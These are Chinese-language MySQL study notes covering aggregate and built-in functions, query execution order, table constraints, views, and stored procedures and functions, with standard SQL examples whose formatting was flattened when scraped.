查看用户权限 SHOW GRANTS FOR &#39;用户名&#39;@&#39;主机名&#39; 函数聚合函数基本聚合函数 函数 说明 AVG() 平均 SUM() 总数 MIN() 最小 MAX() 最大 COUNT(*) 表的行数 COUNT(expr) 返回expr不为空的记录总数 MyISAM和InnoDB的在对行数统计上的区别： MyISAM有个整型计数器在记录行数，通过 count(*)、count(1)、count(列名)都是从该整型值位置获取值； InnoDB不存在行数计数器，因此每次执行count(*)、count(1)、count(列名)都会完整计数一遍行数。 count(列名)和 count(*)可以互换吗： count(*)会统计值为 NULL 的行，而 count(列名)不会统计此列为 NULL 值的行。 GROUP BY12345SELECT column, group_function(column)FROM table[WHERE condition][GROUP BY group_by_expression][ORDER BY column]; Eg: 12345678#单列分组SELECT department_id, AVG(salary)FROM employeesGROUP BY department_id;#多列分组SELECT department_id dept_id, job_id, SUM(salary)FROM employeesGROUP BY department_id, job_id; WITH ROLLUP 该关键字可以让所有查询出的分组记录之后增加一个记录，该记录可计算查询出的所有记录总和。 1234SELECT department_id,AVG(salary)FROM employeesWHERE department_id &gt; 80 #不能在WHERE子句中使用集合函数。GROUP BY department_id WITH ROLLUP; ROLLUP和ORDER BY不可以同时使用，相互排斥。 HAVING 将使用GROUP BY聚合的结果再进行过滤筛选。 行已经被分组; 使用了聚合函数; 满足HAVING 子句中条件的分组将被显示; HAVING 不能单独使用，必须要跟 GROUP BY 一起使用； 不能在WHERE子句中使用聚合函数(GROUP BY)。 WHERE和HAVING的对比： WHERE 可以直接使用表中的字段作为筛选条件，但不能使用分组中的计算函数作为筛选条件；HAVING 必须要与 GROUP BY 配合使用，可以把分组计算的函数和分组字段作为筛选条件； 在查询语法结构中，WHERE 在 GROUP BY 之前，所以无法对分组结果进行筛选。HAVING 在 GROUP BY 之后，可以使用分组字段和分组中的计算函数，对分组的结果集进行筛选； 如果需要通过连接从关联表中获取需要的数据，WHERE 是先筛选后连接，而 HAVING 是先连接后筛选；这一点，就决定了在关联查询中，WHERE 比 HAVING 更高效。因为 WHERE 可以先筛选，用一个筛选后的较小数据集和关联表进行连接，这样占用的资源比较少，执行效率也比较高。HAVING 则需要先把结果集准备好，也就是用未被筛选的数据集进行关联，然后对这个大的数据集进行筛选，这样占用的资源就比较多，执行效率也较低。 总结： 语法 优点 缺点 WHERE 先筛选数据再关联，执行效率高 不能使用分组中的计算函数进行筛选 HAVING 可以使用分组中的计算函数 在最后的结果集中进行筛选，执行效率低 数值函数基本函数 指令 说明 ABS(x) 返回x的绝对值 SIGN(X) 返回X的符号。正数返回1，负数返回-1，0返回0 PI() 返回圆周率的值 CEIL(x)，CEILING(x) 返回大于或等于某个值的最小整数 FLOOR(x) 返回小于或等于某个值的最大整数 LEAST(e1,e2,e3…) 返回列表中的最小值 GREATEST(e1,e2,e3…) 返回列表中的最大值 MOD(x,y) 返回X除以Y后的余数 RAND() 返回0~1的随机值 RAND(x) 返回0~1的随机值，其中x的值用作种子值，相同的X值会产生相同的随机数 ROUND(x) 返回一个对x的值进行四舍五入后，最接近于X的整数 ROUND(x,y) 返回一个对x的值进行四舍五入后最接近X的值，并保留到小数点后面Y位 TRUNCATE(x,y) 返回数字x截断为y位小数的结果 SQRT(x) 返回x的平方根。当X的值为负数时，返回NULL 角度函数 指令 说明 RADIANS(x) 将角度转化为弧度，其中，参数x为角度值 DEGREES(x) 将弧度转化为角度，其中，参数x为弧度值 三角函数 指令 说明 SIN(x) 返回x的正弦值，其中，参数x为弧度值 ASIN(x) 返回x的反正弦值，即获取正弦为x的值。如果x的值不在-1到1之间，则返回NULL COS(x) 返回x的余弦值，其中，参数x为弧度值 ACOS(x) 返回x的反余弦值，即获取余弦为x的值。如果x的值不在-1到1之间，则返回NULL TAN(x) 返回x的正切值，其中，参数x为弧度值 ATAN(x) 返回x的反正切值，即返回正切值为x的值 ATAN2(m,n) 返回两个参数的反正切值 COT(x) 返回x的余切值，其中，X为弧度值 次方与对数函数 指令 说明 POW(x,y)，POWER(X,Y) 返回x的y次方 EXP(X) 返回e的X次方，其中e是一个常数，2.718281828459045 LN(X)，LOG(X) 返回以e为底的X的对数，当X LOG10(X) 返回以10为底的X的对数，当X LOG2(X) 返回以2为底的X的对数，当X 进制转换函数 指令 说明 BIN(x) 返回x的二进制编码 HEX(x) 返回x的十六进制编码 OCT(x) 返回x的八进制编码 CONV(x,f1,f2) 返回f1进制数变成f2进制数 字符串函数 MySQL中，字符串的位置从1开始。 指令 说明 ASCII(S) 返回字符串S中的第一个字符的ASCII码值 CHAR_LENGTH(s) 返回字符串s的字符数。作用与CHARACTER_LENGTH(s)相同 LENGTH(s) 返回字符串s的字节数，和字符集有关 CONCAT(s1,s2,……,sn) 连接s1,s2,……,sn为一个字符串 CONCAT_WS(x,s1,s2,……,sn) 同CONCAT(s1,s2,…)函数，但是每个字符串之间要加上x INSERT(str,idx,len,replacestr) 将字符串str从第idx位置开始，len个字符长的子串替换为字符串replacestr REPLACE(str,a,b) 用字符串b替换字符串str中所有出现的字符串a UPPER(s)或UCASE(s) 将字符串s的所有字母转成大写字母 LOWER(s)或LCASE(s) 将字符串s的所有字母转成小写字母 LEFT(str,n) 返回字符串str最左边的n个字符 RIGHT(str,n) 返回字符串str最右边的n个字符 LPAD(str,len,pad) 用字符串pad对str最左边进行填充，直到str的长度为len个字符 RPAD(str,len,pad) 用字符串pad对str最右边进行填充，直到str的长度为len个字符 LTRIM(s) 去掉字符串s左侧的空格 RTRIM(s) 去掉字符串s右侧的空格 TRIM(s) 去掉字符串s开始与结尾的空格 TRIM(s1 FROM s) 去掉字符串s开始与结尾的s1 TRIM(LEADING s1 FROM s) 去掉字符串s开始处的s1 TRIM(TRAILING s1 FROM s) 去掉字符串s结尾处的s1 REPEAT(str, n) 返回str重复n次的结果 SPACE(n) 返回n个空格 STRCMP(s1,s2) 比较字符串s1,s2的ASCII码值的大小 SUBSTR(s,index,len) 返回从字符串s的index位置其len个字符，作用与SUBSTRING(s,n,len)、MID(s,n,len)相同 LOCATE(substr,str) 返回字符串substr在字符串str中首次出现的位置，作用于POSITION(substr ELT(m,s1,s2,…,sn) 返回指定位置的字符串，如果m&#x3D;1，则返回s1，如果m&#x3D;2，则返回s2，如果m&#x3D;n，则返回sn FIELD(s,s1,s2,…,sn) 返回字符串s在字符串列表中第一次出现的位置 FIND_IN_SET(s1,s2) 返回字符串s1在字符串s2中出现的位置。其中，字符串s2是一个以逗号分隔的字符串 REVERSE(s) 返回s反转后的字符串 NULLIF(value1,value2) 比较两个字符串，如果value1与value2相等，则返回NULL，否则返回value1 日期时间函数 指令 说明 CURDATE()，CURRENT_DATE() 返回当前日期，只包含年、月、日 CURTIME()，CURRENT_TIME() 返回当前时间，只包含时、分、秒 NOW()&#x2F;SYSDATE()&#x2F;CURRENT_TIMESTAMP()&#x2F;LOCALTIME()&#x2F;LOCALTIMESTAMP() 返回当前系统日期和时间 UTC_DATE() 返回UTC（世界标准时间）日期UTC_TIME()返回UTC（世界标准时间）时间 UNIX_TIMESTAMP() 以UNIX时间戳的形式返回当前时间。SELECT UNIX_TIMESTAMP()-&gt;1634348884 UNIX_TIMESTAMP(date) 将时间date以UNIX时间戳的形式返回 FROM_UNIXTIME(timestamp) 将UNIX时间戳的时间转换为普通格式的时间 YEAR(date)&#x2F;MONTH(date)&#x2F;DAY(date) 返回具体的日期值 HOUR(time)&#x2F;MINUTE(time)&#x2F;SECOND(time) 返回具体的时间值 MONTHNAME(date) 返回月份：January，… DAYNAME(date) 返回星期几：MONDAY，TUESDAY…..SUNDAY WEEKDAY(date) 返回周几，注意，周1是0，周2是1，。。。周日是6 QUARTER(date) 返回日期对应的季度，范围为1～4 WEEK(date)，WEEKOFYEAR(date) 返回一年中的第几周 DAYOFYEAR(date) 返回日期是一年中的第几天 DAYOFMONTH(date) 返回日期位于所在月份的第几天 DAYOFWEEK(date) 返回周几，注意：周日是1，周一是2，。。。周六是7 TIME_TO_SEC(time) 将time转化为秒并返回结果值。转化的公式为：小时3600+分钟60+秒 SEC_TO_TIME(seconds) 将seconds描述转化为包含小时、分钟和秒的时间 DATE_ADD(datetime,INTERVAL_exprtype)，ADDDATE(date,INTERVALexprtype) 返回与给定日期时间相差INTERVAL时间段的日期时间 DATE_SUB(date,INTERVALexprtype)，SUBDATE(date,INTERVALexprtype) 返回与date相差INTERVAL时间间隔的日期 ADDTIME(time1,time2) 返回time1加上time2的时间。当time2为一个数字时，代表的是秒，可以为负数 SUBTIME(time1,time2) 返回time1减去time2后的时间。当time2为一个数字时，代表的是秒，可以为负数 DATEDIFF(date1,date2) 返回date1-date2的日期间隔天数 TIMEDIFF(time1,time2) 返回time1-time2的时间间隔 FROM_DAYS(N) 返回从0000年1月1日起，N天以后的日期 TO_DAYS(date) 返回日期date距离0000年1月1日的天数 LAST_DAY(date) 返回date所在月份的最后一天的日期 MAKEDATE(year,n) 针对给定年份与所在年份中的天数返回一个日期 MAKETIME(hour,minute,second) 将给定的小时、分钟和秒组合成时间并返回 PERIOD_ADD(time,n) 返回time加上n后的时间 DATE_FORMAT(date,fmt) 按照字符串fmt格式化日期date值 TIME_FORMAT(time,fmt) 按照字符串fmt格式化时间time值 GET_FORMAT(date_type,format_type) 返回日期字符串的显示格式 STR_TO_DATE(str,fmt) 按照字符串fmt对str进行解析，解析为一个日期 流程控制函数 函数 用法 IF(value,value1,value2) 如果value的值为TRUE，返回value1，否则返回value2 IFNULL(value1,value2) 如果value1不为NULL，返回value1，否则返回value2 CASE WHEN 条件1 THEN 结果1 WHEN 条件2 THEN 结果2 ….[ELSE 值n] END 相当于Java的if…elseif…else… CASE expr WHEN 常量值1 THEN值1 WHEN 常量值1 THEN值1 …. [ELSE 值n] END 相当于Java的switch…case… 12345SELECT employee_id,salary, CASE WHEN salary&gt;=15000 THEN &#x27;高薪&#x27;WHEN salary&gt;=10000 THEN &#x27;潜力股&#x27;WHEN salary&gt;=8000 THEN &#x27;屌丝&#x27;ELSE &#x27;草根&#x27; END &quot;描述&quot;FROM employees; 12SELECT employee_id,12 * salary * (1 + IFNULL(commission_pct,0))FROM employees; 123456SELECT last_name, job_id, salary,CASE job_id WHEN &#x27;IT_PROG&#x27; THEN 1.10*salaryWHEN &#x27;ST_CLERK&#x27; THEN 1.15*salaryWHEN &#x27;SA_REP&#x27; THEN 1.20*salaryELSE salary END &quot;REVISED_SALARY&quot;FROM employees 加密解密函数 函数 用法 PASSWORD(str) 返回字符串str的加密版本，41位长的字符串。加密结果不可逆，常用于用户的密码加密 MD5(str) 返回字符串str的md5加密后的值，也是一种加密方式。若参数为NULL，则会返回NULL SHA(str) 从原明文密码str计算并返回加密后的密码字符串，当参数为NULL时，返回NULL。SHA加密算法比MD5更加安全。 ENCODE(value,password_seed) 返回使用password_seed作为加密密码加密value DECODE(value,password_seed) 返回使用password_seed作为加密密码解密value MySQL信息函数 函数 用法 VERSION() 返回当前MySQL的版本号 CONNECTION_ID() 返回当前MySQL服务器的连接数 DATABASE()，SCHEMA() 返回MySQL命令行当前所在的数据库 USER()，CURRENT_USER()、SYSTEM_USER()，SESSION_USER() 返回当前连接MySQL的用户名，返回结果格式为“主机名@用户名” CHARSET(value) 返回字符串value自变量的字符集 COLLATION(value) 返回字符串value的比较规则 其他函数 函数 用法 FORMAT(value,n) 返回对数字value进行格式化后的结果数据。n表示四舍五入后保留到小数点后n位 CONV(value,from,to) 将value的值进行不同进制之间的转换 INET_ATON(ipvalue) 将以点分隔的IP地址转化为一个数字 INET_NTOA(value) 将数字形式的IP地址转化为以点分隔的IP地址 BENCHMARK(n,expr) 将表达式expr重复执行n次。用于测试MySQL处理expr表达式所耗费的时间 CONVERT(value USING char_code) 将value所使用的字符编码修改为char_code SELECT执行过程查询结构1234567891011121314151617181920212223242526272829#方式1：SELECT ...,....,...FROM ...,...,....WHERE 多表的连接条件AND 不包含组函数的过滤条件GROUP BY ...,...HAVING 包含组函数的过滤条件ORDER BY ... ASC/DESCLIMIT ...,...#方式2：SELECT ...,....,...FROM ... JOIN ...ON 多表的连接条件JOIN ...ON ...WHERE 不包含组函数的过滤条件AND/OR 不包含组函数的过滤条件GROUP BY ...,...HAVING 包含组函数的过滤条件ORDER BY ... ASC/DESCLIMIT ...,...#其中：#（1）from：从哪些表中筛选#（2）on：关联多表查询时，去除笛卡尔积#（3）where：从表中筛选的条件#（4）group by：分组依据#（5）having：在统计结果中再次筛选#（6）order by：排序#（7）limit：分页 执行顺序关键词顺序： 1SELECT ... FROM ... WHERE ... GROUP BY ... HAVING ... ORDER BY ... LIMIT... 语句实际执行顺序： 1FROM -&gt; WHERE -&gt; GROUP BY -&gt; HAVING -&gt; SELECT 的字段 -&gt; DISTINCT -&gt; ORDER BY -&gt; LIMIT 约束 约束 描述 NOT NULL 非空约束，规定某个字段不能为空 UNIQUE 唯一约束，规定某个字段在整个表中是唯一的 PRIMARY KEY 主键(非空且唯一)约束 FOREIGN KEY 外键约束 CHECK 检查约束 DEFAULT 默认值约束 查看某个表已有的约束 1234#information_schema数据库名（系统库）#table_constraints表名称（专门存储各个表的约束）SELECT * FROM information_schema.table_constraintsWHERE table_name = &#x27;表名称&#x27;; 非空约束 NOT NULL1NOT NULL 默认，所有的类型的值都可以是NULL，包括INT、FLOAT等数据类型； 非空约束只能出现在表对象的列上，只能某个列单独限定非空，不能组合非空； 一个表可以有很多列都分别限定了非空； 空字符串’’不等于NULL，0也不等于NULL； 123456789101112#创建时CREATE TABLE 表名称(字段名 数据类型,字段名 数据类型 NOT NULL,字段名 数据类型 NOT NULL);#建表后alter table 表名称 modify 字段名 数据类型 not null;#删除非空约束alter table 表名称 modify 字段名 数据类型 NULL;#去掉not null，相当于修改某个非注解字段，该字段允许为空或alter table 表名称 modify 字段名 数据类型;#去掉not null，相当于修改某个非注解字段，该字段允许为空 唯一约束 UNIQUE1UNIQUE 同一个表可以有多个唯一约束。 唯一约束可以是某一个列的值唯一，也可以多个列组合的值唯一。 唯一性约束允许列值为空。 在创建唯一约束的时候，如果不给唯一约束命名，就默认和列名相同。 MySQL会给唯一约束的列上默认创建一个唯一索引。 1234567891011121314151617181920alter table 表名称 add unique key(字段列表);或#创建时create table 表名称(字段名 数据类型,字段名 数据类型 unique,字段名 数据类型 unique key,字段名 数据类型);create table 表名称(字段名 数据类型,字段名 数据类型,字段名 数据类型,[constraint 约束名] unique key(字段名));#建表后alter table 表名称 add unique key(字段列表);或alter table 表名称 modify 字段名 字段类型 unique;#删除约束 复合唯一约束1234567create table 表名称(字段名 数据类型,字段名 数据类型,字段名 数据类型,unique key(字段列表) #字段列表中写的是多个字段名，多个字段名用逗号分隔，表示那么是复合唯一，即多个字段的组合是唯一的); 删除唯一约束 添加唯一性约束的列上也会自动创建唯一索引。 删除唯一约束只能通过删除唯一索引的方式删除。 删除时需要指定唯一索引名，唯一索引名就和唯一约束名一样。 如果创建唯一约束时未指定名称，如果是单列，就默认和列名相同；如果是组合列，那么默认和()中排在第一个的列名相同。也可以自定义唯一性约束名。 12ALTER TABLE USERDROP INDEX uk_name_pwd； 查看约束 1SELECT * FROM information_schema.table_constraints WHERE table_name = &#x27;表名&#x27;; #查看都有哪些约束 查看索引 1show index from 表名称; 主键约束 PRIMARY KEYprimary key，用来唯一标识表中的一行记录。 主键约束相当于唯一约束+非空约束的组合，主键约束列不允许重复，也不允许出现空值； 一个表中最多只能有一个主键约束，建立主键约束可以在列级别创建，也可以在表级别创建； 主键约束对应表中的一列或多列（复合主键）； 如果是多列组合的复合主键约束，那么这些列都不允许为空值，并且组合的值不允许重复； MySQL的主键名总是PRIMARY，就算自己命名了主键约束名也没用； 当创建主键约束时，系统默认会在所在的列或列组合上建立对应的主键索引（能够根据主键查询的，就根据主键查询，效率更高）。如果删除主键约束了，主键约束对应的索引就自动删除了； 需要注意的一点是，不要修改主键字段的值。因为主键是数据记录的唯一标识，如果修改了主键的值，就有可能会破坏数据的完整性。 添加主键约束建表时 1234567891011CREATE TABLE 表名( 字段名 数据类型 PRIMARY KEY, 字段名 数据类型, 字段名 数据类型);CREATE TABLE 表名( 字段名 数据类型, 字段名 数据类型, 字段名 数据类型， [constraint 约束名] primary key(字段名)); 建表后 1ALTER TABLE 表名称 ADD PRIMARY KEY(字段列表); #字段列表可以是一个字段，也可以是多个字段，如果是多个字段的话，是复合主键 复合主键约束123456create table 表名称(字段名 数据类型,字段名 数据类型,字段名 数据类型,primary key(字段名1,字段名2) #表示字段1和字段2的组合是唯一的，也可以有更多个字段); 删除主键约束1alter table 表名称 drop primary key; 说明：删除主键约束，不需要指定主键名，因为一个表只有一个主键，删除主键约束后，非空还存在。 自增约束 AUTO_INCREMENT 一个表最多只能有一个自增长列; 当需要产生唯一标识符或顺序值时，可设置自增长; 自增长列约束的列必须是键列（主键列，唯一键列）; 自增约束的列的数据类型必须是整数类型; 如果自增列指定了 0 和 null，会在当前最大值的基础上自增；如果自增列手动指定了具体值，直接赋值为具体值。 建表时 123456789101112create table 表名称(字段名 数据类型 primary key auto_increment,字段名 数据类型 unique key not null,字段名 数据类型 unique key,字段名 数据类型 not null default 默认值,);create table 表名称(字段名 数据类型 default 默认值 ,字段名 数据类型 unique key auto_increment,字段名 数据类型 not null default 默认值,,primary key(字段名)); 建表后 1alter table 表名称 modify 字段名 数据类型 auto_increment; 删除自增约束12#alter table 表名称 modify 字段名 数据类型 auto_increment;#给这个字段增加自增约束alter table 表名称 modify 字段名 数据类型; #去掉auto_increment相当于删除 MySQL 8.0新特性—自增变量的持久化在MySQL 8.0之前，自增主键AUTO_INCREMENT的值如果大于max(primary key)+1，在MySQL重启后，会重置AUTO_INCREMENT&#x3D;max(primary key)+1，这种现象在某些情况下会导致业务主键冲突或者其他难以发现的问题。 下面通过案例来对比不同的版本中自增变量是否持久化。 在MySQL 5.7版本中，测试步骤如下： 创建的数据表中包含自增主键的id字段，语句如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344#针对一个自增列，插入四个值。INSERT INTO test1VALUES(0),(0),(0),(0);#查询结果mysql&gt; SELECT * FROM test1;+----+| id |+----+| 1 || 2 || 3 || 4 |+----+4 rows in set (0.00 sec)#删除id为4的记录DELETE FROM test1 WHERE id = 4;#再插入一个空值INSERT INTO test1 VALUES(0);#查询结果mysql&gt; SELECT * FROM test1;+----+| id |+----+| 1 || 2 || 3 || 5 |+----+4 rows in set (0.00 sec)#删除id为5的数据DELETE FROM test1 where id=5;#重启数据库，重新插入一个空值INSERT INTO test1 values(0);#再次查询结果mysql&gt; SELECT * FROM test1;+----+| id |+----+| 1 || 2 || 3 || 4 |+----+4 rows in set (0.00 sec) 从结果可以看出，新插入的0值分配的是4，按照重启前的操作逻辑，此处应该分配6。出现上述结果的主要原因是自增主键没有持久化。 在MySQL 5.7系统中，对于自增主键的分配规则，是由InnoDB数据字典内部一个 计数器来决定的，而该计数器只在内存中维护 ，并不会持久化到磁盘中。当数据库重启时，该计数器会被初始化。 在MySQL 8.0版本中，上述测试步骤最后一步的结果如下： 12345678910mysql&gt; SELECT * FROM test1;+----+| id |+----+| 1 || 2 || 3 || 6 |+----+4 rows in set (0.00 sec) 从结果可以看出，自增变量已经持久化了。MySQL 8.0将自增主键的计数器持久化到 重做日志 中。每次计数器发生改变，都会将其写入重做日志中。如果数据库重启，InnoDB会根据重做日志中的信息来初始化计数器的内存值。 外键约束 FOREIGN KEY 限定某个表的某个字段的引用完整性； 比如：员工表的员工所在部门的选择，必须在部门表能找到对应的部分 主从表关系 主表（父表）：被引用的表，被参考的表 从表（子表）：引用别人的表，参考别人的表 例如：员工表的员工所在部门这个字段的值要参考部门表：部门表是主表，员工表是从表。 例如：学生表、课程表、选课表：选课表的学生和课程要分别参考学生表和课程表，学生表和课程表是主表，选课表是从表。 外键特征 从表的外键列，必须引用&#x2F;参考主表的主键或唯一约束的列； 因为被依赖&#x2F;被参考的值必须是唯一的 在创建外键约束时，如果不给外键约束命名，默认名不是列名，而是自动产生一个外键名（例如student_ibfk_1;），也可以指定外键约束名； 创建(CREATE)表时就指定外键约束的话，先创建主表，再创建从表； 删表时，先删从表（或先删除外键约束），再删除主表； 当主表的记录被从表参照时，主表的记录将不允许删除，如果要删除数据，需要先删除从表中依赖该记录的数据，然后才可以删除主表的数据； 在“从表”中指定外键约束，并且一个表可以建立多个外键约束； 从表的外键列与主表被参照的列名字可以不相同，但是数据类型必须一样，逻辑意义一致。如果类型不一样，创建子表时，就会出现错误“ERROR 1005 (HY000): Can’t createtable’database.tablename’(errno: 150)”； 删除外键约束后，必须 手动 删除对应的索引； 双方约束- 添加了外键约束后，主表的修改和删除数据受约束； 添加了外键约束后，从表的添加和修改数据受约束； 在从表上建立外键，要求主表必须存在； 删除主表时，要求从表先删除，或将从表中外键引用该主表的关系先删除； 添加外键约束建表时 12345678910111213create table 主表名称(字段1 数据类型 primary key,字段2 数据类型);create table 从表名称(字段1 数据类型 primary key,字段2 数据类型,[CONSTRAINT &lt;外键约束名称&gt;] FOREIGN KEY（从表的某个字段) references 主表名(被参考字段));#(从表的某个字段)的数据类型必须与主表名(被参考字段)的数据类型一致，逻辑意义也一样#(从表的某个字段)的字段名可以与主表名(被参考字段)的字段名一样，也可以不一样-- FOREIGN KEY: 在表级指定子表中的列-- REFERENCES: 标示在父表中的列 建表后 1ALTER TABLE 从表名 ADD [CONSTRAINT 约束名] FOREIGN KEY (从表的字段) REFERENCES 主表名(被引用字段) [on update xx][on delete xx]; 删除外键约束123456#第一步先查看约束名和删除外键约束SELECT * FROM information_schema.table_constraints WHERE table_name = &#x27;表名称&#x27;;#查看某个表的约束名ALTER TABLE 从表名 DROP FOREIGN KEY 外键约束名;#第二步查看索引名和删除索引。（注意，只能手动删除）SHOW INDEX FROM 表名称; #查看某个表的索引名ALTER TABLE 从表名 DROP INDEX 索引名; 默认约束 DEFAULT创建123456create table 表名称(字段名 数据类型 primary key,字段名 数据类型 unique key not null,字段名 数据类型 unique key,字段名 数据类型 not null default 默认值,); 123456alter table 表名称 modify 字段名 数据类型 default 默认值;#如果这个字段原来有非空约束，你还保留非空约束，那么在加默认值约束时，还得保留非空约束，否则非空约束就被删除了#同理，在给某个字段加非空约束也一样，如果这个字段原来有默认值约束，你想保留，也要在modify语句中保留默认值约束，否则就删除了alter table 表名称 modify 字段名 数据类型 default 默认值 not null; 删除12alter table 表名称 modify 字段名 数据类型 ;#删除默认值约束，也不保留非空约束alter table 表名称 modify 字段名 数据类型 not null; #删除默认值约束，保留非空 视图 MySQL支持使用INSERT、UPDATE和DELETE语句对视图中的数据进行插入、更新和删除操作。当视图中的数据发生变化时，数据表中的数据也会发生变化，反之亦然。 格式： 12345CREATE [OR REPLACE][ALGORITHM = &#123;UNDEFINED | MERGE | TEMPTABLE&#125;]VIEW 视图名称 [(字段列表)]AS 查询语句[WITH [CASCADED|LOCAL] CHECK OPTION] 精简版： 12CREATE VIEW 视图名称AS 查询语句 Eg: 123456789#创建CREATE VIEW empvu80ASSELECT employee_id, last_name, salaryFROM employeesWHERE department_id = 80;#查询SELECT *FROM salvu80; 在定义视图的时候指定了“ALGORITHM &#x3D; TEMPTABLE”，视图将不支持INSERT和DELETE操作； 视图中不包含基表中所有被定义为非空又未指定默认值的列，视图将不支持INSERT操作； 在定义视图的SELECT语句中使用了 JOIN联合查询 ，视图将不支持INSERT和DELETE操作； 在定义视图的SELECT语句后的字段列表中使用了 数学表达式 或 子查询 ，视图将不支持INSERT，也 不支持UPDATE使用了数学表达式、子查询的字段值； 在定义视图的SELECT语句后的字段列表中使用 DISTINCT 、 聚合函数 、 GROUP BY 、 HAVING 、UNION 等，视图将不支持INSERT、UPDATE、DELETE； 在定义视图的SELECT语句中包含了子查询，而子查询中引用了FROM后面的表，视图将不支持INSERT、UPDATE、DELETE； 视图定义基于一个 不可更新视图 ； 常量视图。 修改视图 CREATE VIEW 子句中各列的别名应和子查询中各列相对应。 123456CREATE OR REPLACE VIEW empvu80(id_number, name, sal, department_id)ASSELECT employee_id, first_name || &#x27; &#x27; || last_name, salary, department_idFROM employeesWHERE department_id = 80; 删除视图1DROP VIEW IF EXISTS 视图名称; 存储过程与函数理解含义存储过程的英文是 Stored Procedure 。它的思想很简单，就是一组经过 预先编译 的 SQL 语句的封装。 执行过程：存储过程预先存储在 MySQL 服务器上，需要执行的时候，客户端只需要向服务器端发出调用存储过程的命令，服务器端就可以把预先存储好的这一系列 SQL 语句全部执行。 好处 简化操作，提高了sql语句的重用性，减少了开发程序员的压力 ； 减少操作过程中的失误，提高效率； 减少网络传输量（客户端不需要把所有的 SQL 语句通过网络发给服务器） 4、减少了 SQL 语句暴露在网上的风险，也提高了数据查询的安全性； 视图、函数的对比它和视图有着同样的优点，清晰、安全，还可以减少网络传输量。不过它和视图不同，视图是虚拟表 ，通常不对底层数据表直接操作，而存储过程是程序化的 SQL，可以直接操作底层数据表 ，相比于面向集合的操作方式，能够实现一些更复杂的数据处理。 一旦存储过程被创建出来，使用它就像使用函数一样简单，我们直接通过调用存储过程名即可。相较于函数，存储过程没有返回值的。 语法创建存储过程12345CREATE PROCEDURE 存储过程名(IN|OUT|INOUT 参数名 参数类型,...)[characteristics ...]BEGIN存储过程体END 参数 含义 IN 当前参数为输入参数，也就是表示入参；存储过程只是读取这个参数的值。如果没有定义参数种类， 默认就是 IN ，表示输入参数。 OUT 当前参数为输出参数，也就是表示出参；执行完成之后，调用这个存储过程的客户端或者应用程序就可以读取这个参数返回的值了。 INOUT 当前参数既可以为输入参数，也可以为输出参数。 形参类型可以是 MySQL数据库中的任意类型。 characteristics 表示创建存储过程时指定的对存储过程的约束条件，其取值信息如下： 12345678910111213141516LANGUAGE SQL# 说明存储过程执行体是由SQL语句组成的，当前系统支持的语言为SQL[NOT] DETERMINISTIC# 指明存储过程执行的结果是否确定。DETERMINISTIC表示结果是确定的。每次执行存储过程时，相同的输入会得到相同的输出。NOT DETERMINISTIC表示结果是不确定的，相同的输入可能得到不同的输出。如果没有指定任意一个值，默认为NOT DETERMINISTIC。&#123; CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA &#125;# 指明子程序使用SQL语句的限制。# CONTAINS SQL表示当前存储过程的子程序包含SQL语句，但是并不包含读写数据的SQL语句；# NO SQL表示当前存储过程的子程序中不包含任何SQL语句；# READS SQL DATA表示当前存储过程的子程序中包含读数据的SQL语句；# MODIFIES SQL DATA表示当前存储过程的子程序中包含写数据的SQL语句。# 默认情况下，系统会指定为CONTAINS SQL。SQL SECURITY &#123; DEFINER | INVOKER &#125;#执行当前存储过程的权限，即指明哪些用户能够执行当前存储过程。# DEFINER 表示只有当前存储过程的创建者或者定义者才能执行当前存储过程；# INVOKER 表示拥有当前存储过程的访问权限的用户能够执行当前存储过程。COMMENT &#x27;string&#x27; 参数 含义 BEGIN…END BEGIN…END中间包含了多个语句，每个语句都以（;）号为结束符。 DECLARE DECLARE用来声明变量，使用的位置在于BEGIN…END语句中间，而且需要在其他语句使用之前进行变量的声明。 SET 赋值语句，用于对变量进行赋值。 SELECT…INTO 把从数据表中查询的结果存放到变量中，也就是为变量赋值。 DELIMITER 新的结束标记。 Eg： 123456DELIMITER $CREATE PROCEDURE select_all_data()BEGINSELECT * FROM emps;END $DELIMITER ; 调用存储过程1CALL 存储过程名(实参列表); 调用in1CALL sp1(&#x27;值&#x27;); 调用OUT123SET @name;CALL sp1(@name);SELECT @name; 调用INOUT123SET @name=值;CALL sp1(@name);SELECT @name; 函数123456CREATE FUNCTION 函数名(参数名 参数类型,...)RETURNS 返回值类型[characteristics ...]BEGIN函数体 #函数体中肯定有 RETURN 语句END 参数列表：指定参数为IN、OUT或INOUT只对PROCEDURE是合法的，FUNCTION中总是默认为IN参数。 RETURNS type 语句表示函数返回数据的类型；RETURNS子句只能对FUNCTION做指定，对函数而言这是 强制 的。它用来指定函数的返回类型，而且函数体必须包含一个 RETURN value 语句。 characteristic 创建函数时指定的对函数的约束。取值与创建存储过程时相同，这里不再赘述。 函数体也可以用2我 N…END来表示SQL代码的开始和结束。如果函数体只有一条语句，也可以省略BEGIN…END。 函数调用在MySQL中，存储函数的使用方法与MySQL内部函数的使用方法是一样的。换言之，用户自己定义的存储函数与MySQL内部函数是一个性质的。区别在于，存储函数是 用户自己定义 的，而内部函数是MySQL的开发者定义的。 语法 1SELECT 函数名(实参列表) 存储函数与存储过程的区别 关键字 调用语法 返回值 应用场景 存储过程 PROCEDURE CALL 存储过程() 理解为有0有或多个 一般用于更新 存储函数 FUNCTION SELECT 函数() 只能是一个 一半用于查询结果为一个值并返回时 此外，存储函数可以放在查询语句中使用，存储过程不行。反之，存储过程的功能更加强大，包括能够执行对表的操作（创建、删除表）和事务操作，这些功能是存储函数不具备的。 存储过程查看、修改和删除查看1SHOW CREATE &#123;PROCEDURE | FUNCTION&#125; 存储过程名或函数名 1SHOW &#123;PROCEDURE | FUNCTION&#125; STATUS [LIKE &#x27;pattern&#x27;] 1SELECT * FROM information_schema.Routines WHERE ROUTINE_NAME=&#x27;存储过程或函数的名&#x27; [AND ROUTINE_TYPE = &#123;&#x27;PROCEDURE|FUNCTION&#x27;&#125;] 修改 修改存储过程或函数，不影响存储过程或函数功能，只是修改相关特性。使用ALTER语句实现。 1ALTER &#123;PROCEDURE | FUNCTION&#125; 存储过程或函数的名 [characteristic ...] 其中，characteristic指定存储过程或函数的特性，其取值信息与创建存储过程、函数时的取值信息略有不同。 123456&#123; CONTAINS SQL | NO SQL | READS SQL DATA | MODIFIES SQL DATA &#125;# CONTAINS SQL ，表示子程序包含SQL语句，但不包含读或写数据的语句；NO SQL ，表示子程序中不包含SQL语句；READS SQL DATA ，表示子程序中包含读数据的语句；MODIFIES SQL DATA ，表示子程序中包含写数据的语句；SQL SECURITY &#123; DEFINER | INVOKER 